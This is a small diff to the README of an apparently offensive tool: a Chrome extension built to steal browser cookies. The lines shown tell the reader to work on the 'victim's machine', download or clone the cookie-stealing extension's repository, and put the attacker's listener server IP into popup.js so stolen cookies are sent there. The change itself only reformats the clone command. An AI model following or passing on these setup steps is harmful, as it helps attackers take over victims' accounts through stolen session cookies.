@@ -21,7 +21,9 @@ B - go to your local computer or victoms machine / computer
 1 - download zip file from https://github.com/fluxx03/cookie_Stealing_chrome_extention
 
 
-    or clone using git `git clone https://github.com/fluxx03/cookie_Stealing_chrome_extention.git`
+    or clone using git 
+    
+    `git clone https://github.com/fluxx03/cookie_Stealing_chrome_extention.git`
     
     
 2 - open popup.js file in plugin folder and add your listerner server ip insted 0.0.0.0
